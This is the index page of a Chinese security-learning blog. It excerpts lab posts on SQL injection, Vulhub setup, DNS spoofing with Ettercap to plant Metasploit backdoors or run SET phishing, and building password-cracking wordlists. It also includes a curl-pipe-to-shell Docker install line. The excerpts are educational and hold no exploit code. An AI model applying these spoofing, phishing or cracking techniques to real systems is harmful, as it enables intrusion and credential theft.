          <p>为了更好的学习sqlmap，尝试看官方文档并翻译官方文档。由于对网络方面的单词不熟悉而且英文水平有限，所以翻译并不准确。</p>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/04/14/Sqlmap-Usage/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/11/Sql-Injection/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/04/11/Sql-Injection/" class="post-title-link" itemprop="url">'SQL注入总结'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-04-11 20:15:59" itemprop="dateCreated datePublished" datetime="2019-04-11T20:15:59+08:00">2019-04-11</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-SQL注入原理"><a href="#1-SQL注入原理" class="headerlink" title="1. SQL注入原理"></a>1. SQL注入原理</h1><p>前端有一个参数用户可控<br>服务器对该参数没有过滤或过滤不严谨<br><strong>本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则</strong><br><img src="/2019/04/11/Sql-Injection/01.01.sql-injection.png"></p>
<h1 id="2-SQL注入危害"><a href="#2-SQL注入危害" class="headerlink" title="2. SQL注入危害"></a>2. SQL注入危害</h1><p>读取数据库的数据<br>修改或删除数据<br>getshell<br>往服务器读写文件</p>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/04/11/Sql-Injection/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/09/Vulhub/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/04/09/Vulhub/" class="post-title-link" itemprop="url">'Vulhub搭建漏洞环境及简单测试'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-04-09 20:39:11" itemprop="dateCreated datePublished" datetime="2019-04-09T20:39:11+08:00">2019-04-09</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-Vulhub搭建"><a href="#1-Vulhub搭建" class="headerlink" title="1.Vulhub搭建"></a>1.Vulhub搭建</h1><h2 id="1-1-docker安装"><a href="#1-1-docker安装" class="headerlink" title="1.1 docker安装"></a>1.1 docker安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh </span><br><span class="line">docker -h</span><br></pre></td></tr></table></figure>
<p>如果第二个命令能出现docker的帮助提示，则表示安装成功<br>如果提示没有curl，可以按照提示安装curl<br>不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。</p>
<h2 id="1-2-安装docker-compose"><a href="#1-2-安装docker-compose" class="headerlink" title="1.2 安装docker-compose"></a>1.2 安装docker-compose</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install docker-compose</span><br><span class="line">docker-compose -v</span><br></pre></td></tr></table></figure>
<p>第二个命令出现版本信息，表示安装成功。<br>提示没有pip，安装提示安装pip</p>
<h2 id="1-3-安装Vulhub"><a href="#1-3-安装Vulhub" class="headerlink" title="1.3 安装Vulhub"></a>1.3 安装Vulhub</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
<h1 id="2-搭建漏洞环境"><a href="#2-搭建漏洞环境" class="headerlink" title="2.搭建漏洞环境"></a>2.搭建漏洞环境</h1><h2 id="2-1-生成容器"><a href="#2-1-生成容器" class="headerlink" title="2.1 生成容器"></a>2.1 生成容器</h2><p>以 Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）为例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /vulhub/drupal/CVE-2014-3704# </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/04/09/Vulhub/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/04/08/I-Want-to-see-U/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/04/08/I-Want-to-see-U/" class="post-title-link" itemprop="url">'使用Ettercap和MSF模块进行DNS欺骗，并植入后门'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-04-08 19:01:44" itemprop="dateCreated datePublished" datetime="2019-04-08T19:01:44+08:00">2019-04-08</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1.工具介绍"></a>1.工具介绍</h1><h2 id="1-1Ettercap"><a href="#1-1Ettercap" class="headerlink" title="1.1Ettercap"></a>1.1Ettercap</h2><blockquote>
<p>Ettercap是一个全面中间人攻击工具。它具有实时连接嗅探、动态内容过滤和许多其他有趣的功能。它支持对许多协议的主动和被动分析，并包含许多用于网络和主机分析的特性。</p>
</blockquote>
<h2 id="1-2MSF模块：browser-autopwn2"><a href="#1-2MSF模块：browser-autopwn2" class="headerlink" title="1.2MSF模块：browser_autopwn2"></a>1.2MSF模块：browser_autopwn2</h2><blockquote>
<p>browser_autopwn2是Metasploit提供的辅助功能模块。在受害者访问Web页面时，它会自动攻击受害者的浏览器。在开始攻击之前，browser_autopwn2能够检测用户使用的浏览器类型， browser_autopwn2将根据浏览器的检测结果，自行选择最合适的EXP。</p>
</blockquote>
<h1 id="2-实验环境"><a href="#2-实验环境" class="headerlink" title="2.实验环境"></a>2.实验环境</h1><table>
<thead>
<tr>
<th style="text-align:center">角色</th>
<th style="text-align:center">系统版本</th>
<th style="text-align:center">IP</th>
<th style="text-align:center">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">靶机</td>
<td style="text-align:center">Windows Server 2003</td>
<td style="text-align:center">192.168.126.149</td>
<td style="text-align:center">无</td>
</tr>
<tr>
<td style="text-align:center">攻击机</td>
<td style="text-align:center">Kali Linux 64 bit <strong>2019.1a</strong></td>
<td style="text-align:center">192.168.126.126</td>
<td style="text-align:center">无</td>
</tr>
</tbody>
</table>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/04/08/I-Want-to-see-U/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/29/Create-Message-Board-with-PHP-Version-2-0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/29/Create-Message-Board-with-PHP-Version-2-0/" class="post-title-link" itemprop="url">'使用PHP编写留言板Version2.0'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-29 16:37:23" itemprop="dateCreated datePublished" datetime="2019-03-29T16:37:23+08:00">2019-03-29</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-改进"><a href="#1-改进" class="headerlink" title="1.改进"></a>1.改进</h1><p>在上一篇<a href="https://chirec.github.io/2019/03/24/Create-Message-Board-with-PHP/">使用PHP编写留言板</a>的结尾处，写了留言板的不足之处。经过一周的PHP学习，打算重新写一遍留言板，对之前的不足做出改进。</p>
<h2 id="1-1删除功能"><a href="#1-1删除功能" class="headerlink" title="1.1删除功能"></a>1.1删除功能</h2><p>新的留言板添加了编辑选项，可以修改留言内容或删除留言。</p>
<h2 id="1-2重复提交"><a href="#1-2重复提交" class="headerlink" title="1.2重复提交"></a>1.2重复提交</h2><p>新的留言板添加了session，而且在提交表单之后会自动跳转到留言板的主页，从而解决了重复提交的Bug。</p>
<h2 id="1-3时间显示问题"><a href="#1-3时间显示问题" class="headerlink" title="1.3时间显示问题"></a>1.3时间显示问题</h2><p>在上一篇其实已经写出了解决方案，新的留言板会使用上次的方案来解决时间显示问题。</p>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/29/Create-Message-Board-with-PHP-Version-2-0/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/26/I-can-not-see-U/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/26/I-can-not-see-U/" class="post-title-link" itemprop="url">'使用Ettercap和SET进行DNS欺骗、钓鱼'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-26 19:51:17" itemprop="dateCreated datePublished" datetime="2019-03-26T19:51:17+08:00">2019-03-26</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1.工具介绍"></a>1.工具介绍</h1><h2 id="1-1Ettercap"><a href="#1-1Ettercap" class="headerlink" title="1.1Ettercap"></a>1.1Ettercap</h2><blockquote>
<p>Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.</p>
</blockquote>
<h2 id="1-2SET-Socail-Engineering-Toolkit"><a href="#1-2SET-Socail-Engineering-Toolkit" class="headerlink" title="1.2SET(Socail-Engineering-Toolkit)"></a>1.2SET(Socail-Engineering-Toolkit)</h2><blockquote>
<p>Social Engineer Toolkit(SET)工具在一个接口囊括了许多有用的社会工程学攻击。SET的主要目的是自动化并改进社会工程学攻击。它能够自动生成隐藏了EXP的 网页或电子邮件消息，同时还能使用Metasploit的payload，例如网页一旦被打开便会连接shell。</p>
</blockquote>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/26/I-can-not-see-U/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/25/Generate-Social-Engineering-Wordlist/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/25/Generate-Social-Engineering-Wordlist/" class="post-title-link" itemprop="url">'生成社工字典'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-25 20:10:41" itemprop="dateCreated datePublished" datetime="2019-03-25T20:10:41+08:00">2019-03-25</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-工具介绍"><a href="#1-工具介绍" class="headerlink" title="1.工具介绍"></a>1.工具介绍</h1><p>两款工具都是国人制作，pydictory可以生成各种字典，并且提供的合并字典、比较字典、词频统计等常用功能。<br>cupper根据提供信息生成社工字典，同样包括一些常用功能。cupper作者对自己手中密码库分析和提取，构建了一个神经网络分析密码结构并分类，而且对密码按照权重排序，提高破解效率。</p>
<h2 id="1-1pydictory"><a href="#1-1pydictory" class="headerlink" title="1.1pydictory"></a>1.1pydictory</h2><blockquote>
<p>你可以用pydictor生成普通爆破字典、基于网站内容的自定义字典、社会工程学字典等等一系列高级字典；<br>你可以使用pydictor的内置工具，对字典进行安全删除、合并、去重、合并并去重、高频词筛选,<br>除此之外，你还可以输入自己的字典，然后使用handler工具，对字典进行各种筛选，编码或加密操作；</p>
<p>你可以通过修改多个配置文件、加入自己的字典、选用leet mode 模式、长度选择、<br>各类字符数量筛选、各类字符种类数筛选、正则表达式筛选，甚至可通过修改<br>/lib/fun/encode.py文件，自定义加密方法等高级操作；按照API编写标准，在/plugins/文件夹下添加自己的插件脚本，在/tools/目录下添加自己的工具脚本等。<br>生成独一无二的高度定制、高效率和复杂字典，生成密码字典的好坏和你的自定义规则、能不能熟练使用pydictor有很大关系；</p>
</blockquote>
<h2 id="1-2cupper"><a href="#1-2cupper" class="headerlink" title="1.2cupper"></a>1.2cupper</h2><blockquote>
<p>cupper可以实现的功能如下：</p>
<ul>
<li>根据目标的信息，生成目标可能使用的密码列表（核心功能）</li>
<li>对各种密码字典进行各式各样的处理，包括检查并删除重复密码、为每一行密码添加新的内容、大小写转换、合并密码字典、分析密码字典、按照一定规则对密码进行排序以提高破解效率</li>
<li>下载作者提供的常用密码字典</li>
</ul>
</blockquote>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/25/Generate-Social-Engineering-Wordlist/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/24/Create-Message-Board-with-PHP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/24/Create-Message-Board-with-PHP/" class="post-title-link" itemprop="url">'使用PHP编写留言板'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-24 15:36:54" itemprop="dateCreated datePublished" datetime="2019-03-24T15:36:54+08:00">2019-03-24</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="PHP留言板结构"><a href="#PHP留言板结构" class="headerlink" title="PHP留言板结构"></a>PHP留言板结构</h1><img src="/2019/03/24/Create-Message-Board-with-PHP/01.Structure.png">
<h1 id="1-新建Message类"><a href="#1-新建Message类" class="headerlink" title="1.新建Message类"></a>1.新建Message类</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Message&#123;</span><br><span class="line">	public $name;</span><br><span class="line">	public $time;</span><br><span class="line">	public $content;</span><br><span class="line"></span><br><span class="line">	function __construct($n,$t,$c)&#123;</span><br><span class="line">		$this-&gt;name=$n;</span><br><span class="line">		$this-&gt;time=$t;</span><br><span class="line">		$this-&gt;content=$c;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function show()&#123;</span><br><span class="line">		echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。<br>在创建对象时，构造函数使将值赋给对象的3个属性。<br>show()方法则是显示留言内容。</p>
<h1 id="2-新建MessageBoard类"><a href="#2-新建MessageBoard类" class="headerlink" title="2.新建MessageBoard类"></a>2.新建MessageBoard类</h1><img src="/2019/03/24/Create-Message-Board-with-PHP/02.MessageBoard.png">
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/24/Create-Message-Board-with-PHP/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/21/Kail-Use-Shellinabox&Ngrok/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="chessur">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Emerald Dream">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/03/21/Kail-Use-Shellinabox&Ngrok/" class="post-title-link" itemprop="url">'Kali使用shellinabox，并使用Ngrok将shellinabox映射到外网'</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2019-03-21 19:49:19" itemprop="dateCreated datePublished" datetime="2019-03-21T19:49:19+08:00">2019-03-21</time>
            

            
          </span>

          

          
            
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="1-shellinabox介绍"><a href="#1-shellinabox介绍" class="headerlink" title="1.shellinabox介绍"></a>1.shellinabox介绍</h1><p>Shellinabox 是一个利用 Ajax 技术构建的基于 Web 浏览器的远程终端模拟器，安装该软件后，服务器端不需要开启 ssh服务，通过 Web 浏览器就可以对远程主机进行操作。使用来登录到系统<a href="http://IP:4200" target="_blank" rel="noopener">http://IP:4200</a>，在启用了SSL/TLS证书，需要用<a href="http://IP:4200" target="_blank" rel="noopener">http://IP:4200</a>来登录。默认情况下shellinabox使用的是4200端口。</p>
<h1 id="2-shellinabox安装"><a href="#2-shellinabox安装" class="headerlink" title="2.shellinabox安装"></a>2.shellinabox安装</h1><p>使用的是系统是Kali Linux 2019，在终端输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install shellinabox</span><br></pre></td></tr></table></figure>
<p>如果提示无法找到包，请添加国内更新源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gedit /etc/apt/sources.list</span><br><span class="line">//添加下列更新源</span><br><span class="line">#清华大学 [更新源]</span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line"></span><br><span class="line">#浙江大学[更新源]</span><br><span class="line">deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
          <!--noindex-->
          
            <div class="post-button text-center">
              <a class="btn" href="/2019/03/21/Kail-Use-Shellinabox&Ngrok/#more" rel="contents">
                Read more &raquo;
              </a>
            </div>
          
          <!--/noindex-->
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">chessur</p>
              <div class="site-description motion-element" itemprop="description"></div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">13</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">3</span>
                    <span class="site-state-item-name">tags</span>
                  
                </div>
              
            </nav>
          

          

          

          
            <div class="links-of-author motion-element">
              
                <span class="links-of-author-item">
                  
                  
                    
                  
                  
                    
                  
                  <a href="https://github.com/ChireC" title="GitHub &rarr; https://github.com/ChireC" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
                </span>
              
            </div>
          

          

          
          

          
            
          
          

        </div>
      </div>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
            <span id="scrollpercent"><span>0</span>%</span>
          
        </div>
      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">chessur</span>

  

  
</div>


  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.0.1</div>




        








        
      </div>
    </footer>

    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>
























  



  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script src="/lib/reading_progress/reading_progress.js"></script>


  


  <script src="/js/src/utils.js?v=7.0.1"></script>

  <script src="/js/src/motion.js?v=7.0.1"></script>



  
  


  <script src="/js/src/affix.js?v=7.0.1"></script>

  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>




  

  


  <script src="/js/src/next-boot.js?v=7.0.1"></script>


  

  

  

  



  




  

  

  

  

  

  

  

  

  

  

  

  

  

  

</body>
</html>
